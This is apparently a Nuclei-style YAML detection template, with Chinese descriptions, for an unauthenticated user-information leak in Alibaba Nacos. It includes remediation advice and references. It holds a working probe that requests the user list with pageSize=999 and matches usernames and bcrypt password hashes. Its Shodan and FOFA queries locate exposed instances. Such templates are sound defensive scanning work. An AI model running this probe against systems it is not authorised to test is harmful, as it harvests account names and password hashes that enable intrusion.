id: nacos-auth-users-info-leak

info:
  name: Alibaba Nacos 未授权用户信息泄露
  author: dahe
  severity: medium
  description: |
    该模板用于核查 Alibaba Nacos 未授权用户信息泄露。该类问题通常源于管理端、API、控制台或服务接口缺少认证授权，导致未登录用户可直接访问敏感功能。模板会向目标发送探测请求，并依据请求 `/nacos/v1/auth/users?pageNo=1&pageSize=999&search=accurate`、`/v1/auth/users?pageNo=1&pageSize=999&search=accurate`、状态码 200、匹配 `application/json`、匹配 `"totalCount"\s*:\s*\d+`等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可在未授权状态下查看系统状态、业务数据、任务信息或管理接口。
    - 若接口支持写操作，可能进一步导致配置篡改、服务接管、数据删除或横向移动。
  remediation: |
    - 为相关管理端和 API 启用认证授权，并按最小权限限制可访问功能。
    - 将管理接口限制在内网、VPN 或可信来源范围内，并开启访问审计。
    - 检查历史访问日志，确认是否存在未授权访问、批量枚举或异常操作。
  reference:
    - https://github.com/alibaba/nacos/issues/4701
    - https://github.com/alibaba/nacos/issues/4593
    - https://nacos.io/en-us/docs/auth.html
  classification:
    cwe-id: CWE-200
    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Nacos"
    fofa-query: app="NACOS"
    product: nacos
    vendor: alibaba
  tags: nacos,unauth,info-leak,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=999&search=accurate"
      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=999&search=accurate"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - "application/json"

      - type: regex
        part: body
        regex:
          - '"totalCount"\s*:\s*\d+'
          - '"pageItems"\s*:\s*\['
          - '"username"\s*:\s*"[^"]+"'
          - '"password"\s*:\s*"\$2a\$'
        condition: and
